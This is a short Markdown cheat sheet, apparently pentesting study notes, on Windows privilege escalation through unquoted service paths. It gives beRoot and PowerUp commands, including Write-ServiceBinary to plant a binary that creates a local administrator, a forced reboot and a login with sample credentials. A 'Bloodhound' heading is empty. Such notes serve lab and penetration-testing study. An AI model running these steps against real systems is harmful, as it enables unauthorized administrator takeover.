# Privilege Escalation

## Unquoted Service Paths
### beRoot
```bash
beRoot.exe # identify privesc options
# look for "[!] Path containing spaces without quotes"
```

### PowerUp
The default exploit used by PowerUp's "Write-ServiceBinary" function creates a local administrator. Use the `-Command` to specify a different exploit. If the unquoted path of your target service is `C:\Program Files\Vuln Server\VulnServer.exe`, the string you would use with `Write-ServiceBinary` is `C:\Program Files\Vuln.exe`. 
```bash
# target Terminal 1:
Import-Module .\PowerUp.ps1
Invoke-AllChecks
# look for "[*] Checking for unquoted service paths"
# pick vulnerable service and copy/paste the string in its "AbuseFunction" field
Write-ServiceBinary -Name "Vuln Server" -Path "C:\Program Files\Vuln.exe"
# check your exploit settings and then get the target to restart (e.g., shutdown /r /t 0)
# login to the target using "john" and "Password123!"
```

## Bloodhound
